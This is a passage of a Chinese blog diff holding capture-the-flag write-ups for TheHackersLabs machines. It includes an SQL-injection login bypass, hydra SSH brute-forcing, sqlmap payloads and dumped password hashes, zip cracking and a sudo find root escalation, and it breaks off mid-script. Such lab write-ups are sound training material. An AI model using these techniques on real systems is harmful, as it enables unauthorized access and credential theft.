@@ -4020,3 +4020,834 @@ id
 uid=0(root) gid=0(root) grupos=0(root)
 ```
 
+## Bocata de Calamares
+
+> **提示:** 靶机跳转传送门
+> [Bocata de Calamares](https://labs.thehackerslabs.com/machines/18)
+
+<img src="/assets/img/thehackerslabs-notes/BocatadeCalamares.png" alt="Bocata de Calamares" style="zoom:50%;" />
+
+### 信息搜集
+
+```bash
+(base) yolo@yolo:~/Desktop/timu/test$ nmap -sV -Pn 10.161.189.31
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-23 21:33 CST
+Nmap scan report for 10.161.189.31
+Host is up (0.68s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.95 seconds
+```
+
+这里再进行路径扫描
+
+```bash
+(base) yolo@yolo:~/Desktop/timu/test$ dirsearch -u http://10.161.189.31/
+/home/yolo/.pyenv/versions/3.13.1/lib/python3.13/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3.post1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/yolo/Desktop/timu/test/reports/http_10.161.189.31/__25-11-23_21-35-44.txt
+
+Target: http://10.161.189.31/
+
+[21:35:44] Starting:
+[21:35:49] 200 -  359B  - /admin.php
+[21:36:02] 301 -  178B  - /images  ->  http://10.161.189.31/images/
+[21:36:02] 403 -    2KB - /images/
+[21:36:04] 200 -    2KB - /login.php
+
+Task Completed
+```
+
+挖到了login.php，然后访问主页，会发现有个关于sql注入的报告，那么login.php考察的自然也是了
+
+直接将报告里面的payload用上，就能进入后台
+
+```
+admin
+' OR '1'='1
+```
+
+然后进去后会找到todo
+
+<img src="/assets/img/thehackerslabs-notes/image-20251123215526231.png" alt="image-20251123215526231" style="zoom:50%;" />
+
+```bash
+(base) yolo@yolo:~/Desktop/timu/test$ echo lee_archivos | base64
+bGVlX2FyY2hpdm9zCg==
+(base) yolo@yolo:~/Desktop/timu/test$ echo -n lee_archivos | base64
+bGVlX2FyY2hpdm9z
+```
+
+处理一下，也就这两种可能了，最后访问`http://10.161.189.31/bGVlX2FyY2hpdm9zCg==.php`成功进入，发现是任意文件读取，直接读取/etc/passwd获取可能利用的用户名
+
+<img src="/assets/img/thehackerslabs-notes/image-20251123215655275.png" alt="image-20251123215655275" style="zoom:50%;" />
+
+暂时没别的路子，那么直接hydra进行爆破吧
+
+### get shell
+
+```bash
+(base) yolo@yolo:~/Desktop/timu/test$ hydra -l superadministrator -P /snap/seclists/rockyou.txt ssh://10.161.189.31
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-23 21:48:24
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ssh://10.161.189.31:22/
+[22][ssh] host: 10.161.189.31   login: superadministrator   password: princesa
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-23 21:49:21
+(base) yolo@yolo:~/Desktop/timu/test$ ssh superadministrator@10.161.189.31
+The authenticity of host '10.161.189.31 (10.161.189.31)' can't be established.
+ED25519 key fingerprint is SHA256:FGZRACBwhyqZdv6wvuqfoIz1l1eoneHbjQfxlQPQz0o.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.161.189.31' (ED25519) to the list of known hosts.
+superadministrator@10.161.189.31's password:
+Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-51-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sun Nov 23 01:51:43 PM UTC 2025
+
+  System load:             0.15
+  Usage of /:              14.1% of 49.21GB
+  Memory usage:            7%
+  Swap usage:              0%
+  Processes:               170
+  Users logged in:         0
+  IPv4 address for enp0s3: 10.161.189.31
+  IPv6 address for enp0s3: 2001:da8:1032:6004::3a1
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+1 update can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Jan 10 17:42:22 2025 from 192.168.1.38
+superadministrator@thehackerslabs-bocatacalamares:~$ cd
+superadministrator@thehackerslabs-bocatacalamares:~$ ls
+flag.txt  recordatorio.txt
+superadministrator@thehackerslabs-bocatacalamares:~$ cat flag.txt
+c3Vkby??????
+superadministrator@thehackerslabs-bocatacalamares:~$ cat recordatorio.txt
+Me han dicho que existe una pagina llamada gtfobins muy util para ctfs, la dejo aquí apuntada para recordarlo mas adelante.
+```
+
+最后一句话呢，说是让我关注GTFobins网站，这我经常用的，好多sudo提权都能在这里面看到案例
+
+```bash
+superadministrator@thehackerslabs-bocatacalamares:~$ sudo -l
+Matching Defaults entries for superadministrator on thehackerslabs-bocatacalamares:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User superadministrator may run the following commands on thehackerslabs-bocatacalamares:
+    (ALL) NOPASSWD: /usr/bin/find
+superadministrator@thehackerslabs-bocatacalamares:~$ sudo /usr/bin/find . -exec /bin/sh \; -quit
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+简单解析下提权命令`sudo /usr/bin/find . -exec /bin/sh \; -quit`
+
+- `-exec /bin/sh \;` 对找到的每个文件都执行一次/bin/sh
+- `-quit` 找到第一个匹配项后就退出
+
+至于那个find .会匹配当前路径下的所有文件
+
+```bash
+superadministrator@thehackerslabs-bocatacalamares:~$ find .
+.
+./flag.txt
+./.bashrc
+./.bash_history
+./.cache
+./.cache/motd.legal-displayed
+./.bash_logout
+./.profile
+./recordatorio.txt
+```
+
+## Binary Trail
+
+> **提示:** 靶机跳转传送门
+> [Binary Trail](https://labs.thehackerslabs.com/machines/8)
+
+<img src="/assets/img/thehackerslabs-notes/BinaryTrail.png" alt="Binary Trail" style="zoom:50%;" />
+
+### 问题一
+
+> ¿Cuál es el nombre del binario sospechoso?
+>
+> 可疑的二进制文件叫什么名字？
+
+我认为这一题可疑先看看靶机上最近新增的文件
+
+```bash
+root@oscar:~# find / -type f -perm -111 -printf "%TY-%Tm-%Td %TH:%TM %p\n" 2>/dev/null | sort -r | head
+
+2024-12-21 13:44 /opt/auth_proxy
+2024-12-21 13:40 /etc/grub.d/10_linux
+2024-12-21 13:38 /etc/grub.d/01_password
+2024-12-19 15:42 /usr/lib/python3/dist-packages/twisted/plugins/dropin.cache
+2024-12-19 15:40 /etc/cloud/clean.d/99-installer
+2024-12-19 15:19 /etc/console-setup/cached_setup_terminal.sh
+2024-12-19 15:19 /etc/console-setup/cached_setup_keyboard.sh
+2024-12-19 15:19 /etc/console-setup/cached_setup_font.sh
+2024-12-17 12:53 /var/lib/dpkg/info/libgstreamer1.0-0:amd64.postinst
+2024-12-17 12:53 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper
+root@oscar:~# file /opt/auth_proxy
+/opt/auth_proxy: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ed5ef5b69092e2e8c0bbb172cfb51ff86c9be333, for GNU/Linux 3.2.0, not stripped
+```
+
+第一个文件auth_proxy嫌疑特别大，一方面，它在/opt/下面，另一方面，它是二进制程序，提交上去是对的
+
+### 问题二
+
+> ¿Qué archivo oculta el binario en el sistema?
+>
+> 这个可疑二进制在系统中隐藏了哪个文件？
+
+看上去是问这个程序在系统中写入了什么，可以逆向处理一下
+
+我用010可以直接看到内部操作
+
+<img src="/assets/img/thehackerslabs-notes/image-20251123223030965.png" alt="image-20251123223030965" style="zoom:50%;" />
+
+当然，直接反编译也能拿到
+
+<img src="/assets/img/thehackerslabs-notes/image-20251123223156694.png" alt="image-20251123223156694" style="zoom:50%;" />
+
+### 问题三
+
+> ¿Qué comando dejó rastros el binario en los logs del sistema?
+>  该二进制在系统日志中留下了什么命令的痕迹？
+
+哈哈，尝试过了好多好多种答案，都失败了，因为根据题意，这里应该是`touch /etc/.shadow_auth`才对，但是提交一直失败，然后尝试touch后就过了，呵，有点难绷哎
+
+### 问题四
+
+> ¿En qué archivo de logs se encontraron los rastros?(RUTA)
+>
+> 在哪个日志文件中找到了痕迹？（路径）
+
+这个文件的话，我在三里面就找到过了，应该是这个文件/var/log/auth.log.1
+
+<img src="/assets/img/thehackerslabs-notes/image-20251123225710549.png" alt="image-20251123225710549" style="zoom:50%;" />
+
+但是提交依然失败，把.1尝试删除，发现成功了，最终答案是`/var/log/auth.log`
+
+### 问题五
+
+>  ¿Qué permisos tiene el archivo oculto /etc/.shadow_auth? (Numérico)
+>
+> 隐藏文件 /etc/.shadow_auth 有什么权限？（数字格式）
+
+简单算算
+
+```bash
+root@oscar:~# ls -la /etc/.shadow_auth
+-rw------- 1 root root 53 dic 21  2024 /etc/.shadow_auth
+```
+
+第一个-不用考虑，是用来区分文件夹和文件的
+
+- rw-(所有者权限)：读(4)+写(2)=6
+- ---(组权限)：无权限=0
+- ---(其他用户权限)：无权限=0
+
+结论：600
+
+## Runers
+
+> **提示:** 靶机跳转传送门
+> [Runers](https://labs.thehackerslabs.com/machines/76)
+
+<img src="/assets/img/thehackerslabs-notes/Runers.png" alt="Runers" style="zoom:50%;" />
+
+### 信息搜集
+
+```bash
+(base) yolo@yolo:~$ nmap -sV -Pn 10.161.189.183
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-23 23:03 CST
+Nmap scan report for 10.161.189.183
+Host is up (0.78s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.45 seconds
+```
+
+怎么这次出现了2222的ssh端口呢，还是先去看看http服务吧
+
+```bash
+(base) yolo@yolo:~$ dirsearch -u http://10.161.189.183/
+/home/yolo/.pyenv/versions/3.13.1/lib/python3.13/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3.post1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/yolo/reports/http_10.161.189.183/__25-11-23_23-05-10.txt
+
+Target: http://10.161.189.183/
+
+[23:05:10] Starting:
+[23:05:11] 403 -  279B  - /.ht_wsr.txt
+[23:05:11] 403 -  279B  - /.htaccess.sample
+[23:05:11] 403 -  279B  - /.htaccess.bak1
+[23:05:12] 403 -  279B  - /.htaccess.save
+[23:05:12] 403 -  279B  - /.htaccess_orig
+[23:05:12] 403 -  279B  - /.htaccess_extra
+[23:05:12] 403 -  279B  - /.htaccess.orig
+[23:05:12] 403 -  279B  - /.htaccess_sc
+[23:05:12] 403 -  279B  - /.htaccessOLD2
+[23:05:12] 403 -  279B  - /.htaccessOLD
+[23:05:12] 403 -  279B  - /.htaccessBAK
+[23:05:12] 403 -  279B  - /.htm
+[23:05:12] 403 -  279B  - /.html
+[23:05:12] 403 -  279B  - /.htpasswds
+[23:05:12] 403 -  279B  - /.httr-oauth
+[23:05:12] 403 -  279B  - /.htpasswd_test
+[23:05:13] 403 -  279B  - /.php
+[23:05:17] 200 -    4KB - /about.php
+[23:05:23] 301 -  317B  - /assets  ->  http://10.161.189.183/assets/
+[23:05:24] 200 -  476B  - /assets/
+[23:05:28] 200 -    0B  - /db.php
+[23:05:32] 200 -  666B  - /images/
+[23:05:32] 301 -  317B  - /images  ->  http://10.161.189.183/images/
+[23:05:34] 200 -    6KB - /LICENSE.txt
+[23:05:40] 200 -    2KB - /posts.php
+[23:05:41] 200 -  535B  - /README.txt
+[23:05:43] 403 -  279B  - /server-status
+[23:05:43] 403 -  279B  - /server-status/
+
+Task Completed
+(base) yolo@yolo:~$ nmap -A -p 2222 10.161.189.183
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-23 23:06 CST
+Nmap scan report for 10.161.189.183
+Host is up (0.0013s latency).
+
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 da:58:27:97:82:a0:b0:c5:96:bc:69:7d:05:a0:c9:34 (RSA)
+|   256 fd:ce:34:44:25:fe:ee:6b:89:46:2d:05:eb:dc:86:f1 (ECDSA)
+|_  256 7f:19:1b:7a:ba:aa:4f:65:62:f1:51:cf:89:c6:e7:b3 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.01 seconds
+```
+
+注意看post.php下面的几篇文章对应url，这里全是用id=1,id=2...进行访问的，然后我们可以意识到，这里应该是有sql注入的
+
+```bash
+(base) yolo@yolo:~$ sqlmap -u "http://10.161.197.250/post.php?id=1" --batch --risk=3 --level=5
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.8.4#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:12:08 /2025-11-24/
+
+[18:12:08] [INFO] resuming back-end DBMS 'mysql'
+[18:12:08] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2983=2983
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 1380 FROM (SELECT(SLEEP(5)))Hcia)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-9251 UNION ALL SELECT CONCAT(0x71716b7871,0x65586f65506d4d50494b7349624d6255474f4b63564d557067455978414f554b625167536f4c7662,0x716b717a71),NULL,NULL-- -
+---
+[18:12:08] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.0.12
+[18:12:08] [INFO] fetched data logged to text files under '/home/yolo/.local/share/sqlmap/output/10.161.197.250'
+[18:12:08] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 18:12:08 /2025-11-24/
+```
+
+可以发现，这里MySQL给我们多种可能的攻击方式，接下来我们就一步一步查表好了
+
+```bash
+sqlmap -u "http://10.161.197.250/post.php?id=1" --dbs
+sqlmap -u "http://10.161.197.250/post.php?id=1" --current-db
+sqlmap -u "http://10.161.197.250/post.php?id=1" --current-user
+sqlmap -u "http://10.161.197.250/post.php?id=1" --tables
+sqlmap -u "http://10.161.197.250/post.php?id=1" -D blog -T users --dump
+```
+
+最后可以拿到一份登录凭证
+
+```bash
+(base) yolo@yolo:~$ sqlmap -u "http://10.161.197.250/post.php?id=1" -D blog -T users --dump
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.8.4#stable}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:15:24 /2025-11-24/
+
+[18:15:24] [INFO] resuming back-end DBMS 'mysql'
+[18:15:24] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2983=2983
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 1380 FROM (SELECT(SLEEP(5)))Hcia)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-9251 UNION ALL SELECT CONCAT(0x71716b7871,0x65586f65506d4d50494b7349624d6255474f4b63564d557067455978414f554b625167536f4c7662,0x716b717a71),NULL,NULL-- -
+---
+[18:15:24] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.0.12
+[18:15:24] [INFO] fetching columns for table 'users' in database 'blog'
+[18:15:24] [INFO] fetching entries for table 'users' in database 'blog'
+[18:15:24] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]
+
+do you want to crack them via a dictionary-based attack? [Y/n/q]
+
+[18:15:26] [INFO] using hash method 'sha256_generic_passwd'
+[18:15:26] [INFO] resuming password 'runner' for hash '527aa9f431539da8e151d5434d1d5e611d973f601d8e970790882624554146b0' for user 'david'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+>
+
+[18:15:27] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N]
+
+[18:15:28] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
+[18:15:28] [INFO] starting 4 processes
+Database: blog
+Table: users
+[3 entries]
++----+---------------------------------------------------------------------------+----------+
+| id | password                                                                  | username |
++----+---------------------------------------------------------------------------+----------+
+| 1  | 527aa9f431539da8e151d5434d1d5e611d973f601d8e970790882624554146b0 (runner) | david    |
+| 2  | 7927e941a969cdf471354e79b7ae29ae25ca04d59f66d6c19f9c43a9367ec498          | maria    |
+| 3  | febb36d29baf28da1a00cad0cc6937d49f13738ff9dd88276e7c85920d2bff40          | ian      |
++----+---------------------------------------------------------------------------+----------+
+
+[18:15:32] [INFO] table 'blog.users' dumped to CSV file '/home/yolo/.local/share/sqlmap/output/10.161.197.250/dump/blog/users.csv'
+[18:15:32] [INFO] fetched data logged to text files under '/home/yolo/.local/share/sqlmap/output/10.161.197.250'
+[18:15:32] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 18:15:32 /2025-11-24/
+```
+
+会发现这里登录不能用22端口，只能使用2222，我突然想到了之前给新生赛出题，启动了个ssh的docker，通过自定义暴露端口，可以要求选手-p指定端口访问
+
+### get shell
+
+```bash
+(base) yolo@yolo:~$ ssh david@10.161.197.250 -p 2222
+The authenticity of host '[10.161.197.250]:2222 ([10.161.197.250]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:0PpHfqtGNxbHeILNpRebyOVMei8/5L6vgtwoUePOZOM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.161.197.250]:2222' (ED25519) to the list of known hosts.
+david@10.161.197.250's password:
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.8.0-49-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Sun Nov 23 15:13:14 2025 from 10.161.155.145
+david@30acf6ca1fb6:~$ id
+uid=1000(david) gid=1000(david) groups=1000(david)
+```
+
+其实从这里的一些命令执行结果，也可以推测出当前是在一个容器中了
+
+```bash
+david@30acf6ca1fb6:~$ ls -la
+total 28
+drwxr-xr-x 4 david david 4096 Nov 28  2024 .
+drwxr-xr-x 1 root  root  4096 Nov 28  2024 ..
+lrwxrwxrwx 1 root  root     9 Nov 28  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 david david  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 david david 3771 Feb 25  2020 .bashrc
+drwx------ 2 david david 4096 Nov 28  2024 .cache
+drwxr-xr-x 2 david david 4096 Nov 28  2024 .hidden
+-rw-r--r-- 1 david david  807 Feb 25  2020 .profile
+david@30acf6ca1fb6:~$ sudo -l
+-bash: sudo: command not found
+david@30acf6ca1fb6:~$ ls -la /
+total 76
+drwxr-xr-x   1 root root 4096 Dec  2  2024 .
+drwxr-xr-x   1 root root 4096 Dec  2  2024 ..
+-rwxr-xr-x   1 root root    0 Nov 28  2024 .dockerenv
+lrwxrwxrwx   1 root root    7 Oct 11  2024 bin -> usr/bin
+drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
+drwxr-xr-x   5 root root  340 Nov 24 10:01 dev
+drwxr-xr-x   1 root root 4096 Dec  2  2024 etc
+drwxr-xr-x   1 root root 4096 Nov 28  2024 home
+lrwxrwxrwx   1 root root    7 Oct 11  2024 lib -> usr/lib
+lrwxrwxrwx   1 root root    9 Oct 11  2024 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root    9 Oct 11  2024 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root   10 Oct 11  2024 libx32 -> usr/libx32
+drwxr-xr-x   2 root root 4096 Oct 11  2024 media
+drwxr-xr-x   2 root root 4096 Oct 11  2024 mnt
+drwxr-xr-x   1 root root 4096 Nov 28  2024 opt
+dr-xr-xr-x 184 root root    0 Nov 24 10:01 proc
+drwx------   1 root root 4096 Dec  2  2024 root
+drwxr-xr-x   1 root root 4096 Nov 24 10:16 run
+lrwxrwxrwx   1 root root    8 Oct 11  2024 sbin -> usr/sbin
+drwxr-xr-x   1 root root 4096 Nov 28  2024 srv
+-rwxr-xr-x   1 root root  209 Dec  2  2024 start.sh
+dr-xr-xr-x  13 root root    0 Nov 24 10:01 sys
+drwxrwxrwt   1 root root 4096 Nov 24 10:18 tmp
+drwxr-xr-x   1 root root 4096 Oct 11  2024 usr
+drwxr-xr-x   1 root root 4096 Nov 27  2024 var
+```
+
+特别是根目录出现了.dockerenv和start.sh
+
+接下来关注下那个当前路径下的.hidden文件夹，里面是个加密的zip压缩包，可以scp传出来进行john爆破
+
+```bash
+(base) yolo@yolo:~/Desktop/timu/test$ zip2john credenciales.zip > ziphash
+ver 2.0 efh 5455 efh 7875 credenciales.zip/credenciales.xlsx PKZIP Encr: TS_chk, cmplen=4728, decmplen=5346, crc=BA8EA891 ts=7424 cs=7424 type=8
+Note: It is normal for some outputs to be very large
+(base) yolo@yolo:~/Desktop/timu/test$ john ziphash --wordlist=/snap/seclists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Cracked 1 password hash (is in /home/yolo/Desktop/tools/john/run/john.pot), use "--show"
+No password hashes left to crack (see FAQ)
+(base) yolo@yolo:~/Desktop/timu/test$ john ziphash --show
+credenciales.zip/credenciales.xlsx:rockandroll:credenciales.xlsx:credenciales.zip::credenciales.zip
+
+1 password hash cracked, 0 left
+```
+
+我这里是因为昨晚爆破过，所以直接--show展现结果了，解密后拿到另一个用户的账密信息
+
+<img src="/assets/img/thehackerslabs-notes/image-20251124182425774.png" alt="image-20251124182425774" style="zoom:50%;" />
+
+```bash
+david@30acf6ca1fb6:~$ su maria
+Password:
+maria@30acf6ca1fb6:/home/david$ id
+uid=1001(maria) gid=1001(maria) groups=1001(maria)
+maria@30acf6ca1fb6:/home/david$ cd
+maria@30acf6ca1fb6:~$ ls
+maria@30acf6ca1fb6:~$ ls -la
+total 36
+drwxr-xr-x 3 maria maria 4096 Nov 23 15:29 .
+drwxr-xr-x 1 root  root  4096 Nov 28  2024 ..
+lrwxrwxrwx 1 root  root     9 Nov 28  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 maria maria  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 maria maria 3771 Feb 25  2020 .bashrc
+drwx------ 2 maria maria 4096 Nov 28  2024 .cache
+-rw------- 1 root  maria   97 Nov 23 15:29 .mysql_history
+-rw-r--r-- 1 maria maria  807 Feb 25  2020 .profile
+-rw-rw-r-- 1 maria maria    0 Dec  2  2024 .selected_editor
+-rw------- 1 maria maria 5145 Nov 23 15:22 .viminfo
+```
+
+登录进后，看到这里有个.viminfo记录文件，读取后，发现maria多次编辑/opt/scripts/backup.sh
+
+```bash
+maria@30acf6ca1fb6:~$ cat .viminfo
+# This viminfo file was generated by Vim 8.1.
+# You may edit it if you're careful!
+
+# Viminfo version
+|1,4
+
+# Value of 'encoding' when this file was written
+*encoding=latin1
+
+
+# hlsearch on (H) or off (h):
+~h
+# Command Line History (newest to oldest):
+:q
+|2,0,1763911325,,"q"
+:q!
+|2,0,1733154665,,"q!"
+:wq
+|2,0,1732826222,,"wq"
+
+# Search String History (newest to oldest):
+
+# Expression History (newest to oldest):
+
+# Input Line History (newest to oldest):
+
+# Debug Line History (newest to oldest):
+
+# Registers:
+""1     LINE    0
+        # Directorio donde se almacenará el backup
+|3,1,1,1,1,0,1732815719,"# Directorio donde se almacenará el backup"
+"2      LINE    0
+        asd:
+|3,0,2,1,1,0,1732815718,"asd:"
+
+# File marks:
+'0  30  0  /opt/scripts/backup.sh
+|4,48,30,0,1763911325,"/opt/scripts/backup.sh"
+'1  1  0  /start.sh
+|4,49,1,0,1733154665,"/start.sh"
+'2  1  0  /tmp/crontab.PxMFFK/crontab
+|4,50,1,0,1733153515,"/tmp/crontab.PxMFFK/crontab"
+'3  3  18  /opt/scripts/backup.sh
+|4,51,3,18,1732826222,"/opt/scripts/backup.sh"
+'4  3  18  /opt/scripts/backup.sh
+|4,52,3,18,1732826222,"/opt/scripts/backup.sh"
+'5  2  0  /opt/scripts/backup.sh
+|4,53,2,0,1732815724,"/opt/scripts/backup.sh"
+'6  2  0  /opt/scripts/backup.sh
+|4,54,2,0,1732815724,"/opt/scripts/backup.sh"
+'7  2  0  /opt/scripts/backup.sh
+|4,55,2,0,1732815724,"/opt/scripts/backup.sh"
+......省略了一些重复的......
+|4,39,1,0,1732815706,"/opt/scripts/backup.sh"
+
+# History of marks within files (newest to oldest):
+
+> /opt/scripts/backup.sh
+        *       1763911323      0
+        "       30      0
+        ^       3       19
+        .       3       18
+        +       2       0
+        +       32      0
+        +       3       0
+        +       3       18
+
+> /start.sh
+        *       1733154664      0
+        "       1       0
+
+> /tmp/crontab.PxMFFK/crontab
+        *       1733153514      0
+        "       1       0
+```
+
+然后
+
+```bash
+maria@30acf6ca1fb6:~$ ls -la /opt/scripts/backup.sh
+-rwxrwx--x 1 root maria 854 Nov 23 15:24 /opt/scripts/backup.sh
+maria@30acf6ca1fb6:~$ cat /opt/scripts/backup.sh
+#!/bin/bash
+
+BACKUP_DIR="/srv/backups"
+DB_NAME="blog"
+DB_USER="root"
+ZIP_PASSWORD="metallica"
+
+BACKUP_FILE="$BACKUP_DIR/blog_backup_$(date +'%Y%m%d%H%M').sql"
+/usr/bin/mysqldump -u $DB_USER $DB_NAME > $BACKUP_FILE
+
+zip -P "$ZIP_PASSWORD" "${BACKUP_FILE}.zip" "$BACKUP_FILE"
+
+rm -f "$BACKUP_FILE"
+
+echo "$(date): Backup comprimido de la base de datos '$DB_NAME' creado en ${BACKUP_FILE}.zip" >> /var/log/backup.log
+
+function cleanup_backups {
+    local total_backups=$(ls -1t "$BACKUP_DIR"/*.zip 2>/dev/null | wc -l)
+
+    if (( total_backups > 10 )); then
+        ls -1t "$BACKUP_DIR"/*.zip | tail -n +11 | while read -r old_backup; do
+            rm -f "$old_backup"
